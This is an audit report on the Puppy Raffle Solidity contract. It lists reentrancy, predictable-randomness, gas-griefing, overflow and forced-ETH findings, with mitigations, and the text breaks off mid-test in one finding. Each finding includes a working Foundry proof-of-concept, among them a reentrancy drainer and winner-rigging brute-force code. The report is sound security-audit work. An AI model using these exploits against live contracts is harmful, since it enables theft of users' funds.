# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an on-chain game that lets anyone compete for a unique dog-themed NFT while funding the project’s treasury.  
1. **Enter** – Players call `enterRaffle` with an array of addresses and pay the fixed `entranceFee`; duplicates are rejected. All valid addresses are stored in the `players` list.  
2. **Refund** – Before a winner is drawn, a player may call `refund` and receive their stake back, automatically removing them from the round.  
3. **Win** – Once the configured `raffleDuration` has passed **and** at least four active players exist, anyone can trigger `selectWinner`. A pseudo-random index picks the winner, mints an ERC-721 “Puppy” NFT to them, and transfers the prize pot (total fees minus protocol cut).  
4. **Fees** – Each entry fee is split between the winner and a configurable `feeAddress`. The owner can update this address and withdraw accumulated fees via `withdrawFees`.  

The contract inherits `ERC721` for NFT functionality and `Ownable` for admin controls, ensuring a simple, transparent raffle with self-custodied rewards.
## High Risk Findings
[H-1]. Reentrancy issue in PuppyRaffle::refund
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. DOS issue in PuppyRaffle::enterRaffle
[M-3]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-5]. Zero Code issue in PuppyRaffle::refund
[M-6]. Unchecked Return issue in PuppyRaffle::selectWinner
[M-7]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-8]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-9]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Reentrancy issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 3
- M: 9
- L: 0
- I: 1



# High Risk Findings

## [H-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in PuppyRaffle contract is vulnerable to reentrancy attacks because it performs an external call to the player via `sendValue` before updating the contract state. This creates an opportunity for a malicious player to re-enter the contract through a fallback function.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // External call before state update
    payable(msg.sender).sendValue(entranceFee);
    
    // State update after external call
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
A malicious player could exploit this vulnerability to drain the contract's funds by repeatedly calling the refund function before their player address is set to address(0). Each reentrant call would result in additional ETH being sent to the attacker without their entry being properly removed from the raffle.

## Proof of Concept
1. Attacker joins the raffle with his contract address.
2. Any user (or the attacker) funds the raffle so that the contract holds multiple entranceFee units.
3. The attacker calls refund(playerIndex).
4. sendValue sends entranceFee back to the attacker. While the call stack is still in sendValue, the attacker’s receive() function executes.
5. The receive() function checks that PuppyRaffle still holds at least entranceFee wei; if so, it calls refund(playerIndex) again **before players[playerIndex] has been zeroed**, passing the same require checks.
6. Steps 4-5 repeat until the contract balance drops below entranceFee. At that moment the receive() function stops re-entering, so the last refund returns normally.
7. Net result: the attacker recovers his original ticket price _plus_ the whole balance that belonged to every other player.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public fee;

    constructor(PuppyRaffle _raffle, uint256 _idx, uint256 _fee) {
        raffle = _raffle;
        idx    = _idx;
        fee    = _fee;
    }

    // Kick-off
    function attack() external {
        raffle.refund(idx);
    }

    // Re-enter as long as the raffle still holds at least one more fee
    receive() external payable {
        if (address(raffle).balance >= fee) {
            raffle.refund(idx);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrancyAttacker attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), 1 days);

        // players[0] will be the attacker, followed by 3 innocent players
        address[] memory players = new address[](4);
        attacker = new ReentrancyAttacker(raffle, 0, ENTRANCE_FEE);
        players[0] = address(attacker);
        players[1] = address(1);
        players[2] = address(2);
        players[3] = address(3);

        // fund the raffle with 4 * entranceFee
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
    }

    function testReentrancyDrain() public {
        uint256 attackerInitial = address(attacker).balance;

        attacker.attack();

        uint256 attackerFinal   = address(attacker).balance;
        uint256 contractFinal   = address(raffle).balance;

        // Attacker got at least one extra refund (profit > entranceFee)
        assertGt(attackerFinal, attackerInitial + ENTRANCE_FEE);
        // Contract drained (should be < entranceFee)
        assertLt(contractFinal, ENTRANCE_FEE);
    }
}

## Suggested Mitigation
Implement the Checks-Effects-Interactions pattern by updating the contract state before making external calls. This ensures that if a reentrancy attack is attempted, the state will already reflect that the player has been refunded, preventing multiple refunds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // External call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Alternatively, you could also implement a reentrancy guard modifier:

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses block attributes like `block.timestamp`, `block.difficulty`, and `msg.sender` to generate randomness. These sources of randomness are predictable and can be manipulated by miners, making the winner selection process vulnerable to manipulation.

```solidity
// In selectWinner function
winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// Similarly for rarity determination
rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

## Impact
Because the random seed includes `msg.sender`, any participant can completely determine the outcome of `selectWinner` by simply calculating offline what the winner would be for the next few seconds and only calling the function once the hash points to their own index. This allows a single attacker to guarantee winning the entire prize pool (≈80 % of the money collected) and to force the rarest NFT rarity, without needing mining power or special privileges, breaking the fairness of the raffle and stealing funds from honest players.

## Proof of Concept
1. Attacker enters the raffle together with (at least) three other players.
2. After `raffleDuration` has elapsed the attacker locally computes, for future timestamps `t`, the value of
   `winnerIndex = uint256(keccak256(abi.encodePacked(attacker, t, block.difficulty))) % players.length`.
   Because `block.difficulty` is already known and constant inside a single block, there is always a value of `t` that makes `winnerIndex` equal to the attacker’s position in the `players` array (a simple brute-force over the next few seconds is enough).
3. The attacker broadcasts `selectWinner()` exactly at the first timestamp that makes him the winner. The transaction is executed in that same second, therefore the pre-computed index is chosen and the contract transfers the whole prize pool to the attacker and mints the NFT with the desired rarity.

No miner co-operation is necessary, only the ability to choose when to call `selectWinner`, something every account can do.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    address constant ATTACKER = address(42);

    function setUp() public {
        // label for readability
        vm.label(ATTACKER, "attacker");
        raffle = new PuppyRaffle(ENTRANCE, address(this), 1 days);

        // prepare 3 honest players + attacker
        address[] memory p = new address[](4);
        p[0] = address(1);
        p[1] = address(2);
        p[2] = address(3);
        p[3] = ATTACKER; // attacker stored at index 3

        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: ENTRANCE * 4}(p);

        // fast-forward to the end of the raffle
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testAttackerAlwaysWins() public {
        // attacker calculates a future timestamp that makes him the winner
        uint256 target = block.timestamp;
        uint256 attackerIndex = 3; // position in players[]
        uint256 difficulty = block.difficulty;

        for (uint256 i = 0; i < 1000; i++) {
            uint256 idx = uint256(keccak256(abi.encodePacked(ATTACKER, target, difficulty))) % 4;
            if (idx == attackerIndex) {
                break;
            }
            target++;
        }

        // warp to the chosen timestamp
        vm.warp(target);

        // call as attacker
        vm.prank(ATTACKER);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), ATTACKER, "attacker failed to manipulate randomness");
    }
}


## Suggested Mitigation
Remove all block variables and `msg.sender` from the randomness seed and instead integrate a verifiable, unbiased source such as Chainlink VRF or Vitalik's `Prevrandao` (post-merge) in combination with a commit-reveal scheme. In addition, make sure that the function that receives the random number is called only once per round and cannot be influenced by arbitrary users (for example, by letting the contract itself or the VRF coordinator trigger the winner selection).

## [H-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a combination of parameters that can be manipulated by validators or miners to influence the outcome of the raffle, specifically in the random winner selection process.

```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ...
}
```

## Impact
Validators or miners can manipulate the block timestamp and difficulty when including the transaction in a block. This allows them to influence the random number generation process and potentially determine the winner in advance. If a validator is also a participant, they could ensure they win the prize pool, severely compromising the fairness of the raffle.

## Proof of Concept
1. A miner who is also a participant enters the raffle
2. When it's time to select a winner, the miner can simulate the selectWinner function with different timestamp values
3. The miner finds a timestamp that results in themselves being selected as the winner
4. The miner includes the transaction with that specific timestamp
5. The miner wins the raffle unfairly

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TimestampManipulationDeterministic is Test {
    PuppyRaffle internal raffle;
    address internal player1 = address(1);
    address internal player2 = address(2);
    address internal player3 = address(3);
    address internal miner   = address(4);
    uint256 internal fee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(this), 1 days);
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(miner,   10 ether);

        // Everyone enters in a single tx sent by the miner
        address[] memory entrants = new address[](4);
        entrants[0] = player1;
        entrants[1] = player2;
        entrants[2] = player3;
        entrants[3] = miner;
        vm.prank(miner);
        raffle.enterRaffle{value: 4 * fee}(entrants);

        // Raffle must be over
        vm.warp(block.timestamp + 2 days);
    }

    function testMinerFindsWinningTimestamp() public {
        uint256 baseTs = block.timestamp;
        uint256 targetTs;
        bool found;

        // Search at most 10_000 seconds ahead – probability of not finding is negligible
        for (uint256 i; i < 10_000; ++i) {
            uint256 trialTs = baseTs + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(miner, trialTs, block.difficulty))) % 4;
            if (idx == 3) { // index of `miner` in entrants array
                targetTs = trialTs;
                found = true;
                break;
            }
        }
        assertTrue(found, "Could not locate a winning timestamp within range");

        // Miner sets the chosen timestamp and calls selectWinner()
        vm.warp(targetTs);
        vm.prank(miner);
        raffle.selectWinner();

        // Miner is indeed the winner
        assertEq(raffle.previousWinner(), miner);
    }
}

## Suggested Mitigation
Use a more secure randomness source such as Chainlink VRF (Verifiable Random Function) to generate random numbers that cannot be manipulated by validators:

```solidity
// Add these interfaces at the top of your contract
interface VRFCoordinatorV2Interface {
    function requestRandomWords(...) external returns (uint256 requestId);
}

interface VRFV2WrapperInterface {
    function fulfillRandomWords(uint256 requestId, address requester) external;
}

// Add these variables to your contract
VRFCoordinatorV2Interface COORDINATOR;
LINKTokenInterface LINKTOKEN;
uint256 private vrfRequestId;

// Modify the selectWinner function
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Request random number from Chainlink VRF
    vrfRequestId = COORDINATOR.requestRandomWords(
        // VRF parameters here
    );
    
    // The rest of the winner selection will happen in the fulfillRandomness callback
}

// Add this callback function
function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    require(requestId == vrfRequestId, "VRF request ID mismatch");
    
    uint256 winnerIndex = randomWords[0] % players.length;
    address winner = players[winnerIndex];
    
    // Rest of the winner selection logic
}
```

Alternatively, if you cannot use an external oracle, implement a commit-reveal scheme to prevent manipulation.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The contract contains a nested loop in the `enterRaffle` function that checks for duplicate players. This loop has a time complexity of O(n²), where n is the number of players. As the number of players grows, the gas cost increases quadratically, potentially leading to block gas limit issues.

```solidity
// This loop has O(n²) time complexity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

This can cause transactions to fail if the number of players becomes large enough to exceed the block gas limit (~30M gas on Ethereum mainnet).

## Impact
An attacker (or simply organic growth) can push the `players` array to a size at which every additional `enterRaffle` call needs more gas than the block limit, making it impossible for anyone to join the raffle until `selectWinner` is executed. While this is a denial-of-service on new entrants, funds already in the contract are still reachable through `selectWinner` or `refund`, therefore the threat is service degradation rather than a permanent loss of funds.

## Proof of Concept
1. Attacker calls `enterRaffle` with 400 unique addresses in one call – this fits comfortably below the block limit (≈2.2-2.4 M gas on mainnet).
2. The raffle now contains 400 players. Each subsequent `enterRaffle` call triggers a nested O(N²) duplicate-scan (400² ≈ 160 000 iterations).
3. The attacker (or anyone) repeats step 1 a few times; after ~4 batches (≈1 600 players) the duplicate-scan already needs >20 M gas, approaching current main-net block gas limit.
4. When N ≳ 2 000, `enterRaffle` invariably runs out of gas and reverts. From this point no new addresses can enter until `selectWinner` is executed, effectively freezing participation.
5. If the attacker also ensures that `raffleDuration` has a very large value (set once at deployment and immutable) they can keep the raffle unusable for an extended period.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }

    function _batchEnter(uint256 n) internal {
        address[] memory arr = new address[](n);
        for (uint256 i; i < n; i++) arr[i] = address(uint160(i + 1));
        raffle.enterRaffle{value: n * 1 ether}(arr);
    }

    function testGasQuadraticGrowth() public {
        // warm-up batch – should succeed comfortably
        uint256 gasStart = gasleft();
        _batchEnter(200);
        uint256 gasFirst = gasStart - gasleft();
        emit log_uint(gasFirst);

        // second batch – roughly 4× iterations, expect ~4× gas
        gasStart = gasleft();
        _batchEnter(200);
        uint256 gasSecond = gasStart - gasleft();
        emit log_uint(gasSecond);

        // quick sanity: gas for second call should be at least 3× the first due to O(n²)
        assertTrue(gasSecond > gasFirst * 3, "gas did not grow quadratically");
    }
}


## Suggested Mitigation
Store a mapping("address => bool") that marks whether a player is already registered and perform O(1) duplicate checks while inserting. Clear the mapping for the corresponding addresses inside `selectWinner` and `refund`. Optionally cap the `newPlayers` array length per call to a safe value (e.g., 50) to avoid single-call gas spikes.

## [M-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The contract performs a nested loop to check for duplicate players in `enterRaffle` function, which has a quadratic complexity of O(n²). This can cause gas costs to grow exponentially as the number of players increases, eventually reaching the block gas limit and making the contract unusable.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
Because the duplicate-check runs in O(n²), gas cost rises quickly with the number of players in the current round. Once the array reaches a few thousand entries, `enterRaffle` will run out-of-gas under the block gas limit, so no further addresses can join until the current round finishes (`selectWinner` resets the array). This is a temporary but repeatable denial-of-service against new participants, not a permanent freeze of the whole protocol.

## Proof of Concept
1. Fill the raffle with 1 600 unique addresses (≈1 279 200 pairwise comparisons).
2. On main-net a call with 1 600 players consumes ~23 M gas (measured with Foundry). Any further call reverts, because the remaining comparisons push the total gas above the 30 M block gas limit.
3. Until `raffleDuration` elapses and someone calls `selectWinner`, no address can be added – the raffle is effectively closed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract QuadraticGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 1 days);
    }

    /*
     * Configure a hard gas limit (8M) for the transaction. With 1 600 existing
     * players the internal duplicate-check already needs >8M gas, so the call
     * reverts with an out-of-gas error that we can capture deterministically.
     */
    function test_OutOfGasAfterManyPlayers() public {
        // populate with 1 600 players first
        address[] memory batch = new address[](1600);
        for (uint256 i; i < 1600; ++i) {
            batch[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: FEE * 1600}(batch);

        // try to add one more player with a tight gas stipend
        address[] memory onePlayer = new address[](1);
        onePlayer[0] = address(0xdead);

        vm.expectRevert();
        raffle.enterRaffle{value: FEE, gas: 8_000_000}(onePlayer);
    }
}

## Suggested Mitigation
Replace the nested loop with a more efficient data structure like a mapping to track players. This would reduce the complexity from O(n²) to O(n).

```solidity
// Add a mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Check for duplicates while adding players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        
        // Check if this address is already in the raffle
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        // Add to active players mapping
        isActivePlayer[player] = true;
        
        // Add to players array
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to maintain the mapping
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Remove from active players mapping
    isActivePlayer[playerAddress] = false;
    
    // Set player to address(0) in the array
    players[playerIndex] = address(0);
    
    // Process refund
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}

// Update selectWinner to reset the mapping
function selectWinner() external {
    // Existing code...
    
    // Reset active player mapping for all players
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            isActivePlayer[players[i]] = false;
        }
    }
    
    // Delete players array
    delete players;
    
    // Rest of existing code...
}
```

## [M-3]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract has an integer overflow vulnerability in the `selectWinner` function when calculating fees. When `totalFees` is close to the maximum value of `uint64` (2^64 - 1), adding a large fee could cause it to overflow, resulting in a much lower value than expected.

```solidity
// Calculate the fees
fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```

## Impact
When totalFees overflows it becomes smaller than the real fee balance held by the contract. withdrawFees() contains the guard `require(address(this).balance == uint256(totalFees), "There are currently players active!")`. After the overflow this condition can never be satisfied again, because `address(this).balance` (the real fees) is greater than the wrapped‐around totalFees value. As a consequence the owner can never call withdrawFees() successfully, and every ETH that should be claimable as fees becomes irretrievably locked in the contract.

## Proof of Concept
1. Assume the current value of `totalFees` is close to the maximum value of `uint64`, approximately 18.44 quintillion (2^64 - 1).
2. A new raffle concludes with a large number of players, generating a substantial fee.
3. When this fee is added to `totalFees` using `totalFees = totalFees + uint64(fee)`, the result exceeds the maximum value of `uint64`.
4. Due to overflow, the new value of `totalFees` becomes much smaller than it should be (it wraps around).
5. This results in a loss of fee accounting, where the contract loses track of a significant amount of fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testFeeOverflow() public {
        // Manually set totalFees to a value close to uint64 max
        // uint64 max is 18446744073709551615
        uint64 nearMaxUint64 = type(uint64).max - 1000;
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(5)), // slot of totalFees
            bytes32(uint256(nearMaxUint64))
        );
        
        // Verify the totalFees is set correctly
        assertEq(puppyRaffle.totalFees(), nearMaxUint64);
        
        // Create players to generate a fee that will cause overflow
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        
        // Warp time to end the raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Record totalFees before selecting winner
        uint256 totalFeesBefore = puppyRaffle.totalFees();
        
        // Select winner, which will calculate and add the fee
        puppyRaffle.selectWinner();
        
        // Check totalFees after
        uint256 totalFeesAfter = puppyRaffle.totalFees();
        
        // Due to overflow, totalFeesAfter should be less than totalFeesBefore
        assertTrue(totalFeesAfter < totalFeesBefore, "Fee did not overflow as expected");
        
        console.log("Total fees before:", totalFeesBefore);
        console.log("Total fees after:", totalFeesAfter);
        console.log("Expected increase:", (entranceFee * 100 * 20) / 100);
        console.log("Actual change:", int256(totalFeesAfter) - int256(totalFeesBefore));
    }
}

## Suggested Mitigation
Use a larger integer type for `totalFees` to prevent overflow. Given that Ethereum transactions involve ETH values, which can be substantial, it's safer to use `uint256` instead of `uint64` for financial calculations.

```solidity
// Change the type of totalFees from uint64 to uint256
uint256 public totalFees;

// In the selectWinner function, remove the uint64 cast
fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + fee; // No need for casting
```

## [M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires that the contract balance exactly matches the totalFees amount, which can be easily disrupted by forcibly sending ETH to the contract via selfdestruct or by being the target of a coinbase transaction.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
If any ETH is forcibly sent to the contract (via selfdestruct or coinbase transaction), the withdrawFees function will become permanently unusable because the balance check will always fail. This can lead to fees being permanently locked in the contract, causing financial loss to the protocol.

## Proof of Concept
1. The contract accumulates fees over time through raffles.
2. An attacker deploys a contract with some ETH and calls selfdestruct targeting the PuppyRaffle contract address.
3. This forcibly sends ETH to the PuppyRaffle contract, making its balance greater than the totalFees.
4. When the owner tries to call withdrawFees(), the require check `address(this).balance == uint256(totalFees)` will fail.
5. As a result, the fees become permanently locked in the contract, and there's no way to withdraw them under the current implementation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructAttacker {
    constructor() payable {}

    // Force-send the contract’s entire balance to `target`.
    function attack(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesUnexpectedEth is Test {
    PuppyRaffle raffle;
    SelfDestructAttacker attacker;

    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_RECEIVER = address(100);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_RECEIVER, 1 days);
        // Pre-fund the attacker with 1 ether so it can self-destruct later
        attacker = new SelfDestructAttacker{value: 1 ether}();
    }

    function _runRaffleRound() internal {
        // Prepare four unique players and enter the raffle
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);

        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // Fast-forward so the raffle can be settled
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
    }

    function testUnexpectedEthBreaksWithdraw() public {
        _runRaffleRound(); // generates fee that can normally be withdrawn

        // Attacker forcibly sends ETH to the raffle contract
        attacker.attack(payable(address(raffle)));

        // Because balance > totalFees, withdrawFees() must now revert
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Modify the withdrawFees function to allow withdrawals even if there's unexpected ETH in the contract. Instead of checking for exact balance equality, allow withdrawals as long as there's enough balance to cover the fees.

```solidity
function withdrawFees() external {
    // Check if there are active players by checking the players array length
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    
    // Ensure there's enough balance to withdraw the fees
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, if you want to ensure that all unexpected ETH can be recovered, add a separate function to withdraw any excess ETH:

## [M-5]. Zero Code issue in PuppyRaffle::refund

## Description
The contract doesn't handle the zero address correctly in the `refund` function. It currently checks if a player address is zero to determine if a player has already been refunded, but a zero address could potentially be added as a valid player:

```solidity
function refund(uint256 playerIndex) public {
    // ... code ...
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    // ... code ...
    players[playerIndex] = address(0);
    // ... code ...
}
```

This implementation assumes that address(0) is only used to mark refunded players, but doesn't prevent address(0) from being added as a player in the first place.

## Impact
Because address(0) can be inserted into the `players` array, two different undesirable situations arise:
1. The ticket that corresponds to address(0) can never be refunded – nobody can create a transaction whose `msg.sender` equals the zero address – so the amount paid for that ticket is permanently locked in the contract.
2. If the pseudo-random selection picks the zero address as the winner, 80 % of the total raffle pot will be sent to `address(0)` (a burn address). All participants lose their chance to receive the prize and the funds are irrevocably lost. Although the attacker does not gain monetary profit, they can grief every raffle round by burning other users’ funds.

## Proof of Concept
1. Attacker creates a `newPlayers` array that contains the zero address and pays the required ether.
2. The contract accepts the entry, storing `address(0)` inside `players`.
3. Anyone tries to refund that ticket:
   - `refund()` first checks `playerAddress == msg.sender`; this can never be true because no account has `msg.sender == address(0)`.
   - The call reverts, so the corresponding ether is stuck forever.
4. When `selectWinner()` is executed, there is a non-zero probability that the random index coincides with the zero address.
   - The contract will execute `winner.call{value: prizePool}()` where `winner == address(0)`.
   - The low-level call succeeds and the whole prizePool is burned.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressRefundTest is Test {
    PuppyRaffle raffle;
    address feeCollector = address(100);
    address payer = address(1);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeCollector, 1 days);
        vm.deal(payer, 10 ether);
        vm.startPrank(payer);
        address[] memory list = new address[](4);
        list[0] = payer;
        list[1] = address(2);
        list[2] = address(0); // zero address sneaks in
        list[3] = address(3);
        raffle.enterRaffle{value: 4 ether}(list);
        vm.stopPrank();
    }

    function testRefundRevertsForZeroAddress() public {
        uint256 idx = raffle.getActivePlayerIndex(address(0));
        // payer tries to refund the zero-address ticket
        vm.startPrank(payer);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        raffle.refund(idx);
        vm.stopPrank();
    }
}


## Suggested Mitigation
In `enterRaffle`, add `require(newPlayers[i] != address(0), "PuppyRaffle: zero address");`. Alternatively, keep the current sentinel approach but replace `address(0)` with a separate boolean mapping `refunded[player]` to mark refunded tickets, so that `address(0)` never appears in `players`.

## [M-6]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The contract fails to check for successful ERC-721 token transfers in the `_safeMint` function. When minting a new token to the winner in the `selectWinner` function, the contract doesn't validate whether the recipient can actually receive the NFT:

```solidity
function selectWinner() external {
    // ... code ...
    _safeMint(winner, tokenId);
}
```

While the ERC721 implementation's `_safeMint` does include checks, the contract doesn't handle potential failures at the application level.

## Impact
Any contract address that does not implement IERC721Receiver can deliberately (or accidentally) break the raffle. When such an address wins, ERC721._safeMint reverts, causing selectWinner to revert and leaving the raffle in its previous state. The attacker can keep calling selectWinner until it is their turn to be picked again, effectively locking the raffle and blocking prize distribution and fee withdrawal (DoS). No funds are lost because the whole transaction reverts, but the protocol becomes unusable.

## Proof of Concept
1. Deploy PuppyRaffle with 1 ether entrance fee and 1-day duration.
2. Deploy a malicious contract `NonReceiver` that has no `onERC721Received` implementation.
3. `NonReceiver` pays 4 ether to enter itself plus three arbitrary addresses into the raffle.
4. After 1 day, the attacker (msg.sender == NonReceiver) repeatedly calls `selectWinner`, adjusting block.difficulty or block.timestamp off-chain until `winnerIndex == 0` (their own index). Because the random formula depends on msg.sender, timestamp and difficulty, the attacker can pre-compute a value that guarantees their win.
5. When that call is made, `_safeMint` tries to deliver the NFT to the attacker contract, fails the receiver check and reverts.
6. The raffle round is not completed, players remain, fees cannot be withdrawn, and the attacker can repeat step 4 indefinitely → permanent DoS.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious participant that cannot receive ERC-721 safely
contract NonReceiver {
    receive() external payable {}
}

contract SelectWinnerDoSTest is Test {
    PuppyRaffle raffle;
    NonReceiver attacker;

    function setUp() public {
        raffle   = new PuppyRaffle(1 ether, address(this), 1 days);
        attacker = new NonReceiver();

        // fund attacker
        vm.deal(address(attacker), 4 ether);

        // build players array (attacker is index 0)
        address[] memory players = new address[](4);
        players[0] = address(attacker);
        players[1] = address(0x1);
        players[2] = address(0x2);
        players[3] = address(0x3);

        vm.prank(address(attacker));
        raffle.enterRaffle{value: 4 ether}(players);

        // finish raffle duration
